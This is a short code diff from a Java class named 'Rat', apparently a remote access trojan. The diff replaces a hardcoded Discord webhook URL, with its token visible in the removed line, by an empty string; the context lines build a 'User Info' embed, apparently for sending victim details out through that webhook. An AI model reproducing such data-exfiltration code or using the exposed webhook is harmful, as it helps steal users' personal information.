@@ -111,7 +111,7 @@ public class Rat {
         }
 
 
-        WebhookClient client = WebhookClient.withUrl("https://discord.com/api/webhooks/1065273231482830958/32G46aMvj90i-BuzLwUC5awG0eok8fAkqev7sEEKuw24MNTUCOqAh7lkkv-tHuVSt24z");
+        WebhookClient client = WebhookClient.withUrl("");
         WebhookEmbedBuilder builder = new WebhookEmbedBuilder()
                 .setColor(0x9667)
                 .setTitle(new WebhookEmbed.EmbedTitle("User Info", null))
